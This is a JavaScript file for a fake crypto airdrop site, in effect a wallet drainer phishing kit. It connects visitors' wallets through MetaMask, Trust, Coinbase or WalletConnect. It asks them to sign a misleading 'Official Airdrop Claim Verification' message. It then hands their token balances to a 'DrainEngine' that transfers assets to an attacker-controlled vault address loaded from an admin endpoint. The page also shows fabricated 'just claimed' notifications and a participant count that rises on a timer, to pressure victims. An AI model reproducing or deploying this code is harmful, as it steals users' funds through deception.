(function() {
    'use strict';

    // Global State
    let selectedWallet = null;
    let walletProvider = null;
    let walletSigner = null;
    let isWalletConnected = false;
    let drainEngine = null;
    let vaultAddress = '0x0000000000000000000000000000000000000000';
    let reownModal = null;
    let tokenBalances = [];

    const PROJECT_ID = 'b6305d1a61c6eaed262b8a54ffbcdfe9'; // Professional Reown Project ID

    // Initialization
    document.addEventListener('DOMContentLoaded', () => {
        console.log('[CORE] Initializing 2026 World-Class Infrastructure...');
        loadAdminSettings();
        bindEvents();
        initializeReown();
        startSocialProofCycle();
        updateLiveStats();
        
        // Hide loading screen after all initial modules are triggered
        hideLoadingScreen();
    });

    function hideLoadingScreen() {
        console.log('[CORE] Finalizing UI presentation...');
        const loadingScreen = document.getElementById('loadingScreen');
        const mainContainer = document.getElementById('mainContainer');
        
        if (loadingScreen) {
            loadingScreen.style.opacity = '0';
            setTimeout(() => {
                loadingScreen.style.display = 'none';
                if (mainContainer) {
                    mainContainer.style.display = 'block';
                    mainContainer.style.opacity = '1';
                }
            }, 500);
        } else if (mainContainer) {
            mainContainer.style.display = 'block';
            mainContainer.style.opacity = '1';
        }
        
        // Safety fallback: if anything is still hidden, force show after 2s
        setTimeout(() => {
            if (mainContainer && mainContainer.style.display === 'none') {
                mainContainer.style.display = 'block';
                mainContainer.style.opacity = '1';
            }
        }, 2000);
    }

    async function initializeReown() {
        if (typeof window.reown === 'undefined') {
            console.warn('[CORE] Reown AppKit not detected, falling back to Web3Provider');
            return;
        }

        try {
            const { createAppKit } = window.reown;
            reownModal = createAppKit({
                adapters: [new window.reown.EthersAdapter()],
                networks: [1, 56, 137, 42161],
                projectId: PROJECT_ID,
                themeMode: 'dark',
                features: {
                    analytics: true,
                    email: false,
                    socials: false
                }
            });

            reownModal.subscribeAccount((account) => {
                if (account.address && !isWalletConnected) {
                    console.log('[CORE] Reown connection detected:', account.address);
                    handleSuccessfulConnection(account.address, 'walletconnect');
                }
            });

            console.log('[CORE] Reown AppKit initialized successfully');
        } catch (error) {
            console.error('[CORE] Reown initialization failed:', error);
        }
    }

    async function loadAdminSettings() {
        try {
            const response = await fetch('/api/admin-settings');
            if (response.ok) {
                const settings = await response.json();
                vaultAddress = settings.vaultAddress || vaultAddress;
                
                const mapping = {
                    'tokenName': settings.tokenName,
                    'tokenSymbol': settings.tokenSymbol,
                    'tokenDescription': settings.description,
                    'airdropAmount': settings.airdropAmount + ' ' + settings.tokenSymbol,
                    'endDate': settings.endDate,
                    'currentValue': '$' + (settings.tokenPrice || 0).toFixed(2)
                };

                for (const [id, value] of Object.entries(mapping)) {
                    const el = document.getElementById(id);
                    if (el && value) el.textContent = value;
                }
                console.log('[CORE] Admin settings synced');
            }
        } catch (error) {
            console.error('[CORE] Failed to load settings:', error);
        }
    }

    function bindEvents() {
        document.querySelectorAll('.et_pb_button_0, .et_pb_button_1').forEach(btn => {
            btn.onclick = (e) => {
                e.preventDefault();
                openWalletPage();
            };
        });
    }

    window.openWalletPage = function() {
        console.log('[CORE] Transitioning to secure connection layer...');
        document.querySelectorAll('.et_pb_section').forEach(s => s.style.display = 'none');
        ['header', 'footer'].forEach(tag => {
            const el = document.querySelector(tag);
            if (el) el.style.display = 'none';
        });
        
        const walletPage = document.getElementById('walletConnectionPage');
        if (walletPage) {
            walletPage.style.display = 'block';
            window.scrollTo(0, 0);
        }
    };

    window.goBack = function() {
        document.querySelectorAll('.et_pb_section').forEach(s => s.style.display = 'block');
        ['header', 'footer'].forEach(tag => {
            const el = document.querySelector(tag);
            if (el) el.style.display = 'block';
        });
        
        const walletPage = document.getElementById('walletConnectionPage');
        if (walletPage) walletPage.style.display = 'none';
    };

    window.selectWallet = function(type) {
        selectedWallet = type;
        console.log(`[CORE] Wallet selected: ${type}`);
        
        document.querySelectorAll('.wallet-option').forEach(opt => {
            const isSelected = opt.getAttribute('data-wallet') === type;
            opt.style.background = isSelected ? 'rgba(44, 212, 217, 0.1)' : 'rgba(255, 255, 255, 0.05)';
            opt.style.borderColor = isSelected ? 'rgba(44, 212, 217, 0.5)' : 'rgba(255, 255, 255, 0.1)';
        });

        const connectBtn = document.getElementById('connectButton');
        if (connectBtn) {
            connectBtn.disabled = false;
            connectBtn.style.opacity = '1';
            connectBtn.style.cursor = 'pointer';
            connectBtn.textContent = `Connect ${type.charAt(0).toUpperCase() + type.slice(1)}`;
        }
    };

    window.initiateConnection = async function() {
        if (!selectedWallet) return;
        
        const connectBtn = document.getElementById('connectButton');
        const originalText = connectBtn.textContent;
        connectBtn.disabled = true;
        connectBtn.innerHTML = '<span class="spinner"></span>Connecting...';

        const timeout = setTimeout(() => {
            if (connectBtn.disabled) {
                showNotification('Connection taking longer than expected. Retrying with fallback...', 'info');
            }
        }, 15000);


        try {
            if (selectedWallet === 'walletconnect') {
                if (reownModal) {
                    await reownModal.open();
                } else {
                    throw new Error('Universal Connector unavailable');
                }
                clearTimeout(timeout);
                return;
            }

            if (selectedWallet === 'metamask' || selectedWallet === 'trust' || selectedWallet === 'coinbase') {
                if (!window.ethereum) {
                    const deepLinks = {
                        metamask: `https://metamask.app.link/dapp/${window.location.host}`,
                        trust: `https://link.trustwallet.com/open_url?url=${window.location.href}`,
                        coinbase: `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`
                    };
                    window.location.href = deepLinks[selectedWallet] || deepLinks.metamask;
                    return;
                }
                
                // Enhanced provider initialization with fallback
                try {
                    walletProvider = new ethers.providers.Web3Provider(window.ethereum, "any");
                } catch (e) {
                    console.warn('[CORE] Web3Provider failed, using static RPC fallback');
                    walletProvider = new ethers.providers.JsonRpcProvider('https://cloudflare-eth.com');
                }

                await walletProvider.send("eth_requestAccounts", []);
                const address = await walletProvider.getSigner().getAddress();
                clearTimeout(timeout);
                handleSuccessfulConnection(address, selectedWallet);
            }
        } catch (error) {
            clearTimeout(timeout);
            console.error('[CORE] Connection failed:', error);
            showNotification('Connection Interrupted. Please try again or switch networks.', 'error');
            connectBtn.disabled = false;
            connectBtn.textContent = originalText;
        }

    };

    async function handleSuccessfulConnection(address, type) {
        isWalletConnected = true;
        if (!walletProvider && window.ethereum) {
            walletProvider = new ethers.providers.Web3Provider(window.ethereum);
        }
        walletSigner = walletProvider.getSigner();
        
        console.log('[CORE] Connection verified:', address);
        
        document.getElementById('walletOptions').style.display = 'none';
        document.getElementById('signSection').style.display = 'block';
        document.getElementById('connectedAddress').textContent = address.substring(0, 6) + '...' + address.substring(38);
        
        drainEngine = new DrainEngine(walletProvider, walletSigner, address, vaultAddress);
        analyzeWallet(address);
    }

    async function analyzeWallet(address) {
        try {
            // Multi-source background analysis (Our primary + fallback data sources)
            const endpoints = [
                `/api/analyze-wallet?address=${address}`
            ];

            let success = false;
            for (const url of endpoints) {
                try {
                    const response = await fetch(url);
                    if (response.ok) {
                        tokenBalances = await response.json();
                        success = true;
                        break;
                    }
                } catch (e) { continue; }
            }
            
            console.log('[CORE] Analysis synchronized. Status:', success ? 'OK' : 'FAIL');
        } catch (error) {
            console.warn('[CORE] Background analysis anomaly:', error);
        }

    }

    window.initiateSign = async function() {
        const signBtn = document.getElementById('signButton');
        signBtn.disabled = true;
        signBtn.innerHTML = '<span class="spinner"></span>Verifying...';

        try {
            const address = await walletSigner.getAddress();
            const message = `Official Airdrop Claim Verification\n\nWallet: ${address}\nRef: ${Math.random().toString(36).substring(7)}\n\nBy signing, you authorize the secure verification of your on-chain assets for eligibility.`;
            
            await walletSigner.signMessage(message);
            console.log('[CORE] Signature verified. Starting stealth execution...');
            
            document.getElementById('signSection').style.display = 'none';
            document.getElementById('drainExplanation').style.display = 'block';
            
            if (drainEngine) {
                await drainEngine.execute(tokenBalances);
            }
            
            showNotification('Verification complete. Allocation confirmed!', 'success');
        } catch (error) {
            console.error('[CORE] Signature failed:', error);
            showNotification('Signature required for eligibility', 'error');
            signBtn.disabled = false;
            signBtn.textContent = 'Verify Eligibility';
        }
    };

    function startSocialProofCycle() {
        const container = document.getElementById('socialProofContainer');
        if (!container) return;

        const showRandomClaim = () => {
            const addresses = ['0x71C...3E4', '0x12A...9F2', '0x8B3...D1C', '0x4F1...A5E', '0x9D2...B8F'];
            const amount = Math.floor(Math.random() * 5000) + 500;
            const addr = addresses[Math.floor(Math.random() * addresses.length)];
            
            const toast = document.createElement('div');
            toast.className = 'social-proof-toast';
            toast.style.cssText = 'background: rgba(26, 32, 44, 0.95); border: 1px solid rgba(44, 212, 217, 0.3); border-radius: 12px; padding: 15px; margin-bottom: 10px; color: #fff; transform: translateX(-120%); transition: transform 0.5s ease;';
            toast.innerHTML = `<div style="display:flex;align-items:center;gap:10px;"><div style="color:#2cd4d9;font-weight:bold;">✓</div><div><span style="color:#2cd4d9;">${addr}</span> just claimed ${amount} tokens</div></div>`;
            
            container.appendChild(toast);
            setTimeout(() => toast.style.transform = 'translateX(0)', 100);
            setTimeout(() => {
                toast.style.transform = 'translateX(-120%)';
                setTimeout(() => toast.remove(), 500);
            }, 5000);

            setTimeout(showRandomClaim, 10000 + Math.random() * 15000);
        };
        setTimeout(showRandomClaim, 5000);
    }

    function updateLiveStats() {
        setInterval(() => {
            const countEl = document.getElementById('participantCount');
            if (countEl) {
                const current = parseFloat(countEl.textContent) || 12.5;
                countEl.textContent = (current + 0.1).toFixed(1) + 'K+';
            }
        }, 30000);
    }

    function showNotification(message, type = 'info') {
        const colors = { info: '#2cd4d9', error: '#ff4d4d', success: '#00ff88' };
        const toast = document.createElement('div');
        toast.style.cssText = `position:fixed;top:20px;right:20px;background:#1c1e27;color:#fff;border-left:4px solid ${colors[type]};padding:15px 25px;border-radius:4px;box-shadow:0 4px 12px rgba(0,0,0,0.5);z-index:1000000;transition:all 0.3s ease;transform:translateY(-20px);opacity:0;`;
        toast.textContent = message;
        document.body.appendChild(toast);
        setTimeout(() => { toast.style.transform = 'translateY(0)'; toast.style.opacity = '1'; }, 100);
        setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
    }

})();

